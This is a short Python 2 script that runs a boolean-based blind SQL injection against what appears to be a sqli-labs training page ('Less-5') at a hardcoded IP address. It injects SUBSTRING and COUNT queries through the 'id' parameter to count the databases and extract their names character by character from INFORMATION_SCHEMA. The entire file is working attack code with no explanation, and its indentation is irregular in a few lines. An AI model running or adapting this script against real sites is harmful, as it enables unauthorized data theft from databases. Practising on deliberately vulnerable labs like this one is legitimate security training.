# py2
import requests
import string
dataset = " abcdefghijklmnopqrstuvwxyz_"
querydata = "schema_name"
querydb = "INFORMATION_SCHEMA"
def sendPayload(payload):
	url = "http://129.211.79.54:8801/Less-5/?id=1' "+ payload
	content = requests.get(url).text
	return content
def findDatabaseNumber():
	count = 1
	while count:
		payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="
		payload = payload + str(count) + "--+"
		recv = sendPayload(payload)
		if "You are in" in recv:
			return count
		else:
			count += 1
def getDatabaseName(dbNum):
	for k in range(dbNum):
		i = 1
		result = ""
		while i :
			for j in dataset:
				querysql = "AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j
				recv = sendPayload(querysql)
				if "You are in" in recv:
					if j != ' ':
						result += j
						i += 1
					else:
						print result
						i = 0
  					break
def exp():
	dbNum = findDatabaseNumber()
 	print "the number of database is "+str(dbNum)
 	getDatabaseName(dbNum)
exp()